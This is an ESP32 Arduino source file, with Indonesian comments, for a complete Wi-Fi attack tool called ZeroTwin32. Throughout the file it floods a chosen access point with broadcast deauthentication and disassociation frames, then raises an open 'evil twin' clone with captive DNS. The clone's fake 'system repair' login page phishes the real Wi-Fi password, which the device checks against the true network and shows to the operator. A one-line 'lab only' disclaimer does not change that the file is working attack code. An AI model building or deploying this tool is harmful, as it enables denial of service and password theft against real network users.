// ============================================================================
// ZEROTWIN ESP32 — evil twin + deauther + tombol fisik + monitor HP
// Target board: ESP32 DEVKIT V1 (bekas proyek smart pet feeder), core 4.0.0
//
// Bedanya dengan versi ESP8266:
//   - Deauth pakai esp_wifi_80211_tx() (ESP-IDF), bukan wifi_send_pkt_freedom()
//   - Tombol default DIGITAL (GPIO 18/19/21/22/23, INPUT_PULLUP) -> pin kosong
//     terbaca HIGH, jadi tidak ada aksi palsu saat tidak ada modul tombol
//   - OLED opsional (default mati): board pet feeder tidak punya layar
//   - AP kontrol + password bisa diubah dari panel, disimpan di LittleFS
//
// Hanya untuk lab / jaringan milik sendiri.
// ============================================================================
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <esp_wifi.h>

// ---------------- OLED opsional ---------------------------------------------
#define USE_OLED 0          // 1 kalau mau pakai SSD1306 (butuh lib Adafruit)
#if USE_OLED
  #include <Wire.h>
  #include <Adafruit_GFX.h>
  #include <Adafruit_SSD1306.h>
  Adafruit_SSD1306 display(128, 64, &Wire, -1);
#endif

// ---------------- AP kontrol ------------------------------------------------
#define AP_SSID_DEFAULT "ZeroTwin32"
#define AP_PASS_DEFAULT "zero8888"
#define AP_CFG_PATH     "/zt32_ap.txt"
char apSsid[33] = AP_SSID_DEFAULT;
char apPass[33] = AP_PASS_DEFAULT;

// ---------------- tombol fisik ----------------------------------------------
// 0 = digital (satu tombol satu GPIO, aktif LOW), 1 = ADC ladder satu pin
#define BTN_ADC     0
#define BTN_PIN_ADC 34                  // ADC1_CH6, input-only di ESP32
#define BTN_ENABLED 1
static const uint8_t BTN_PINS[5] = { 18, 19, 21, 22, 23 };  // UP,DOWN,OK,BACK,EXTRA

// ---------------- state -----------------------------------------------------
struct ApInfo { char ssid[33]; uint8_t ch; uint8_t bssid[6]; int8_t rssi; };
static const uint8_t MAX_AP = 16;

WebServer   web(80);
DNSServer   dns;
ApInfo      aps[MAX_AP];
uint8_t     apCount = 0;
int8_t      targetIdx = -1;

bool        twinOn = false;
bool        deauthOn = false;
uint32_t    sentFrames = 0;
uint32_t    lastDeauth = 0;
uint32_t    lastScan = 0;
uint32_t    bootMs = 0;

String      tryPass = "";
String      correctInfo = "";
String      lastEvent = "boot";

int         btnRaw = 0, btnLastVal = 0, btnCand = -1, btnCandCnt = 0;
const char* btnLast = "-";

// ---------------- util ------------------------------------------------------
String macStr(const uint8_t* b){
  char s[18];
  snprintf(s, sizeof(s), "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
  return String(s);
}

void oledStatus(const String& ev){
  if(ev.length()) lastEvent = ev;
#if USE_OLED
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);  display.print("ZeroTwin32 "); display.print(millis() / 1000); display.println("s");
  display.setCursor(0, 10); display.print("AP : "); display.println(apSsid);
  display.setCursor(0, 20); display.print("Tgt: "); display.println(targetIdx >= 0 ? String(aps[targetIdx].ssid) : String("-"));
  display.setCursor(0, 30); display.print("D:"); display.print(deauthOn ? "ON " : "off");
  display.print(" T:"); display.println(twinOn ? "ON" : "off");
  display.setCursor(0, 40); display.print("Pkt: "); display.println(sentFrames);
  display.setCursor(0, 50); display.print("Pass: "); display.println(tryPass.length() ? tryPass : String("-"));
  display.setCursor(0, 58); display.println(ev);
  display.display();
#else
  Serial.printf("[ZT32] %s | AP=%s tgt=%s d=%d t=%d pkt=%u heap=%u\n",
                ev.c_str(), apSsid,
                targetIdx >= 0 ? aps[targetIdx].ssid : "-",
                deauthOn, twinOn, sentFrames, ESP.getFreeHeap());
#endif
}

// ---------------- AP kontrol: simpan / muat / terapkan ----------------------
void loadApCfg(){
  File f = LittleFS.open(AP_CFG_PATH, "r");
  if(!f) return;
  String ss = f.readStringUntil('\n'); ss.trim();
  String pp = f.readStringUntil('\n'); pp.trim();
  f.close();
  if(ss.length() >= 1 && ss.length() <= 32) ss.toCharArray(apSsid, sizeof(apSsid));
  if(pp.length() == 0 || pp.length() >= 8)  pp.toCharArray(apPass, sizeof(apPass));
}

void saveApCfg(){
  File f = LittleFS.open(AP_CFG_PATH, "w");
  if(!f) return;
  f.println(apSsid);
  f.println(apPass);
  f.close();
}

void startControlAp(){
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  if(strlen(apPass) >= 8) WiFi.softAP(apSsid, apPass, 1);
  else                    WiFi.softAP(apSsid, NULL, 1);
  dns.start(53, "*", IPAddress(192, 168, 4, 1));
}

// ---------------- scan ------------------------------------------------------
void doScan(){
  int n = WiFi.scanNetworks(false, true);
  apCount = 0;
  for(int i = 0; i < n && apCount < MAX_AP; i++){
    const uint8_t* b = WiFi.BSSID(i);
    if(!b) continue;
    String ss = WiFi.SSID(i);
    strncpy(aps[apCount].ssid, ss.length() ? ss.c_str() : "<hidden>", 32);
    aps[apCount].ssid[32] = 0;
    memcpy(aps[apCount].bssid, b, 6);
    aps[apCount].ch   = WiFi.channel(i);
    aps[apCount].rssi = (int8_t)WiFi.RSSI(i);
    apCount++;
  }
  WiFi.scanDelete();
  lastScan = millis();
  if(targetIdx >= (int)apCount) targetIdx = -1;
}

// ---------------- evil twin -------------------------------------------------
void startTwin(){
  if(targetIdx < 0) return;
  dns.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(aps[targetIdx].ssid);                 // kembaran: SSID sama, terbuka
  dns.start(53, "*", IPAddress(192, 168, 4, 1));
  twinOn = true;
  oledStatus(String("twin ON: ") + aps[targetIdx].ssid);
}

void stopTwin(){
  twinOn = false;
  dns.stop();
  startControlAp();
  oledStatus("twin off");
}

void stopAll(){
  deauthOn = false;
  if(twinOn) stopTwin();
  oledStatus("semua stop");
}

// ---------------- deauth (ESP-IDF raw 802.11) -------------------------------
void sendDeauth(uint8_t frameType, const uint8_t* bssid, uint8_t ch){
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t frame[26] = {
    frameType, 0x00,        // frame control: 0xC0 deauth / 0xA0 disassoc
    0x00, 0x00,             // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // destination: broadcast
    0, 0, 0, 0, 0, 0,       // source: diisi BSSID target
    0, 0, 0, 0, 0, 0,       // BSSID: target
    0x00, 0x00,             // sequence
    0x07, 0x00              // reason: class 3 error
  };
  memcpy(&frame[10], bssid, 6);
  memcpy(&frame[16], bssid, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}

void deauthStep(){
  if(!deauthOn || targetIdx < 0) return;
  if(millis() - lastDeauth < 1000) return;
  lastDeauth = millis();

  sendDeauth(0xC0, aps[targetIdx].bssid, aps[targetIdx].ch);   // deauth
  sendDeauth(0xA0, aps[targetIdx].bssid, aps[targetIdx].ch);   // disassoc
  sentFrames += 2;

  // balik ke kanal AP kontrol supaya panel HP tidak ikut putus
  if(!twinOn) esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

// ---------------- tombol fisik ----------------------------------------------
int readButton(){
#if BTN_ADC
  int v = analogRead(BTN_PIN_ADC);
  btnRaw = v;
  if(v > 3000) return 0;
  if(v > 2400) return 1;
  if(v > 1800) return 2;
  if(v > 1200) return 3;
  if(v > 600)  return 4;
  return 5;
#else
  for(int i = 0; i < 5; i++){
    if(digitalRead(BTN_PINS[i]) == LOW){ btnRaw = i + 1; return i + 1; }
  }
  btnRaw = 0;
  return 0;
#endif
}

void handleButtons(){
#if BTN_ENABLED
  int b = readButton();
  if(b != btnCand){ btnCand = b; btnCandCnt = 0; return; }
  if(btnCandCnt < 5){ btnCandCnt++; return; }      // wajib stabil ~25 ms
  if(b == 0){ btnLastVal = 0; return; }
  if(b == btnLastVal) return;
  btnLastVal = b;

  if(b == 1){                                     // UP: target berikutnya
    btnLast = "UP";
    if(apCount) targetIdx = (targetIdx + 1) % apCount;
    oledStatus("target: " + String(targetIdx >= 0 ? aps[targetIdx].ssid : "-"));
  } else if(b == 2){                              // DOWN: scan ulang
    btnLast = "DOWN";
    doScan();
    oledStatus("scan ulang");
  } else if(b == 3){                              // OK: deauth on/off
    btnLast = "OK";
    deauthOn = !deauthOn;
    oledStatus(deauthOn ? "deauth ON" : "deauth off");
  } else if(b == 4){                              // BACK: twin on/off
    btnLast = "BACK";
    twinOn ? stopTwin() : startTwin();
  } else {                                        // EXTRA: stop semua
    btnLast = "EXTRA";
    stopAll();
  }
#endif
}

// ---------------- panel -----------------------------------------------------
const char PANEL_HEAD[] PROGMEM = R"HTML(
<html><head><meta charset='utf-8'><meta name='viewport' content='initial-scale=1.0, width=device-width'>
<title>ZeroTwin32</title><style>
body{background:#1a1a1a;color:#bfbfbf;font-family:Arial,sans-serif;margin:0}
.content{max-width:800px;margin:auto;padding:.6em}
table{border-collapse:collapse;width:100%}
th,td{padding:8px 6px;text-align:left;border:solid rgb(204,12,207) 1px;font-size:.85em}
button{height:36px;padding:0 14px;color:#fff;font-size:11px;font-weight:600;letter-spacing:.1rem;
text-transform:uppercase;background:#2f3136;border-radius:4px;border:none;cursor:pointer}
button:hover{background:#42444a}
h1{font-size:1.3rem;background:#2f3136;color:#bfbfbb;padding:.2em .6em;border-radius:3px;
border-left:solid #d1114d 5px;font-weight:100}
input{padding:7px;border-radius:4px;border:1px solid #444;background:#222;color:#eee;margin:.2em 0}
#mon{font-family:monospace;color:#37c6f0;font-size:.8em;padding:.4em 0;word-break:break-all}
</style></head><body><div class='content'>
<h1 style="text-align:center;font-size:1.9rem;border:solid #bd0b61 3px">Zer0Twin32</h1>
<div id='mon'>memuat status...</div>
<h1>AP Kontrol</h1>
)HTML";

String panelHtml(){
  String h = FPSTR(PANEL_HEAD);
  h += "<form method='post' action='/?setap=1'>SSID <input name='ssid' maxlength='32' value='" + String(apSsid) +
       "'> Password <input name='pass' maxlength='32' value='" + String(apPass) +
       "' placeholder='kosong = terbuka'> <button>Simpan AP</button></form>";

  h += "<h1>Att4ck</h1><div>";
  h += "<form style='display:inline-block' method='post' action='/?deauth=";
  h += deauthOn ? "stop'><button" : "start'><button";
  if(targetIdx < 0) h += " disabled";
  h += ">"; h += deauthOn ? "Stop Deauth" : "Start Deauth";
  h += "</button></form>";

  h += "<form style='display:inline-block;padding-left:8px' method='post' action='/?hotspot=";
  h += twinOn ? "stop'><button" : "start'><button";
  if(targetIdx < 0 && !twinOn) h += " disabled";
  h += ">"; h += twinOn ? "Stop Evil-Twin" : "Start Evil-Twin";
  h += "</button></form>";

  h += "<form style='display:inline-block;padding-left:8px' method='post' action='/?stop=1'><button>Stop Semua</button></form></div>";

  h += "<h1>P4nel</h1><table><tr><th>SSID</th><th>RSSI</th><th>BSSID</th><th>CH</th><th></th></tr>";
  for(int i = 0; i < apCount; i++){
    h += "<tr><td>" + String(aps[i].ssid) + "</td><td>" + String(aps[i].rssi) + "</td><td>" +
         macStr(aps[i].bssid) + "</td><td>" + String(aps[i].ch) + "</td>";
    h += "<td><form method='post' action='/?ap=" + String(i) + "'>";
    h += (i == targetIdx) ? "<button style='background:#20c20e;color:#000'>Selected</button>"
                          : "<button>Select</button>";
    h += "</form></td></tr>";
  }
  h += "</table><br>";

  if(correctInfo != "") h += "<h1>R3sult</h1><h3>" + correctInfo + "</h3>";

  h += "<script>setInterval(async function(){try{let s=await (await fetch('/api/status')).json();"
       "document.getElementById('mon').textContent='up '+s.up+'s | heap '+s.heap+' | target '+s.target"
       "+' | deauth '+s.deauth+' | twin '+s.twin+' | pkt '+s.pkt+' | btn '+s.btn+' ('+s.btnRaw+')"
       "+' | pass '+(s.pass||'-');}catch(e){}},2000);</script>";
  h += "</div></body></html>";
  return h;
}

String loginPage(){
  String a = (targetIdx >= 0) ? String(aps[targetIdx].ssid) : String("WiFi");
  return "<!DOCTYPE html><html><head><meta charset='utf-8'>"
         "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
         "<title>" + a + " :: Login</title><style>"
         "body{color:#333;font-family:Arial;margin:0}nav{background:#dc214c;color:#fff;padding:1em;font-size:1.2em}"
         "input{width:100%;padding:10px;margin:8px 0;border:1px solid #1e31b5;box-sizing:border-box}"
         "div{padding:1em}</style></head><body><nav><b>" + a + "</b></nav>"
         "<div><h2>Login</h2><p>Masukkan kata sandi WiFi untuk melanjutkan perbaikan sistem.</p>"
         "<form action='/'><b>Password:</b><input type='password' name='password'>"
         "<input type='submit' value='Login'></form></div></body></html>";
}

// ---------------- route -----------------------------------------------------
void handleStatus(){
  String s = "{\"up\":" + String((millis() - bootMs) / 1000) +
             ",\"heap\":" + String(ESP.getFreeHeap()) +
             ",\"target\":\"" + (targetIdx >= 0 ? String(aps[targetIdx].ssid) : String("")) + "\"" +
             ",\"deauth\":\"" + (deauthOn ? "ON" : "off") + "\"" +
             ",\"twin\":\"" + (twinOn ? "ON" : "off") + "\"" +
             ",\"pkt\":" + String(sentFrames) +
             ",\"btn\":\"" + String(btnLast) + "\",\"btnRaw\":" + String(btnRaw) +
             ",\"pass\":\"" + tryPass + "\",\"ssid\":\"" + String(apSsid) + "\"" +
             ",\"aps\":" + String(apCount) + "}";
  web.send(200, "application/json", s);
}

void handleResult(){
  if(WiFi.status() != WL_CONNECTED){
    oledStatus("pass salah");
    web.send(200, "text/html",
      "<html><head><script>setTimeout(function(){window.location.href='/';},3000);</script>"
      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
      "<body><h2>You entered wrong password</h2><p>Try again...</p></body></html>");
    return;
  }
  correctInfo = "Password untuk " + String(aps[targetIdx].ssid) + "<br>Hasil: " + tryPass;
  deauthOn = false;
  oledStatus("pass BENAR");
  if(twinOn) stopTwin();
  web.send(200, "text/html",
    "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
    "<body><h2>System repair has been completed!</h2></body></html>");
}

void handleRoot(){
  if(web.hasArg("setap")){
    String ns = web.arg("ssid"); ns.trim();
    String np = web.arg("pass"); np.trim();
    bool changed = false;
    if(ns.length() >= 1 && ns.length() <= 32 && ns != String(apSsid)){ ns.toCharArray(apSsid, sizeof(apSsid)); changed = true; }
    if((np.length() == 0 || np.length() >= 8) && np != String(apPass)){ np.toCharArray(apPass, sizeof(apPass)); changed = true; }
    saveApCfg();
    if(changed && !twinOn) startControlAp();
    oledStatus(String("AP: ") + apSsid);
    web.send(200, "text/html", panelHtml());
    return;
  }

  if(web.hasArg("ap")){
    int i = web.arg("ap").toInt();
    if(i >= 0 && i < (int)apCount){
      targetIdx = i;
      oledStatus(String("target: ") + aps[i].ssid);
    }
    web.send(200, "text/html", panelHtml());
    return;
  }

  if(web.hasArg("deauth")){
    deauthOn = (web.arg("deauth") == "start") && targetIdx >= 0;
    oledStatus(deauthOn ? "deauth ON" : "deauth off");
    web.send(200, "text/html", panelHtml());
    return;
  }

  if(web.hasArg("hotspot")){
    if(web.arg("hotspot") == "start") startTwin();
    else                              stopTwin();
    web.send(200, "text/html", panelHtml());
    return;
  }

  if(web.hasArg("stop")){
    stopAll();
    web.send(200, "text/html", panelHtml());
    return;
  }

  if(twinOn && web.hasArg("password")){
    tryPass = web.arg("password");
    WiFi.disconnect();
    WiFi.begin(aps[targetIdx].ssid, tryPass.c_str(), aps[targetIdx].ch, aps[targetIdx].bssid);
    oledStatus("coba pass...");
    web.send(200, "text/html",
      "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
      "<script>setTimeout(function(){window.location.href='/result';},15000);</script>"
      "<body><h2>Repairing router system...</h2><p>Please wait...</p></body></html>");
    return;
  }

  if(twinOn){ web.send(200, "text/html", loginPage()); return; }

  web.send(200, "text/html", panelHtml());
}

// ---------------- setup / loop ---------------------------------------------
void setup(){
  Serial.begin(115200);
  delay(200);
  bootMs = millis();

#if USE_OLED
  Wire.begin(21, 22);
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)){
    Serial.println("[ZT32] OLED gagal, lanjut tanpa layar");
  }
#endif

#if BTN_ENABLED && !BTN_ADC
  for(int i = 0; i < 5; i++) pinMode(BTN_PINS[i], INPUT_PULLUP);
#endif
#if BTN_ADC
  analogReadResolution(12);
  pinMode(BTN_PIN_ADC, INPUT);
#endif

  LittleFS.begin(true);
  loadApCfg();

  WiFi.mode(WIFI_AP_STA);
  WiFi.setSleep(false);
  startControlAp();

  // raw 802.11 TX: interface STA harus up + promiscuous untuk injeksi frame
  esp_wifi_set_promiscuous(true);

  web.on("/",           HTTP_GET,  handleRoot);
  web.on("/result",     HTTP_GET,  handleResult);
  web.on("/api/status", HTTP_GET,  handleStatus);
  web.onNotFound([](){ web.sendHeader("Location", "http://192.168.4.1/"); web.send(302, "text/plain", ""); });
  web.begin();

  doScan();
  oledStatus("siap");
  Serial.printf("[ZT32] AP %s http://192.168.4.1 | %u AP terdeteksi\n", apSsid, apCount);
}

void loop(){
  dns.processNextRequest();
  web.handleClient();
  handleButtons();
  deauthStep();

  if(millis() - lastScan >= 15000){ doScan(); }
  delay(2);
}
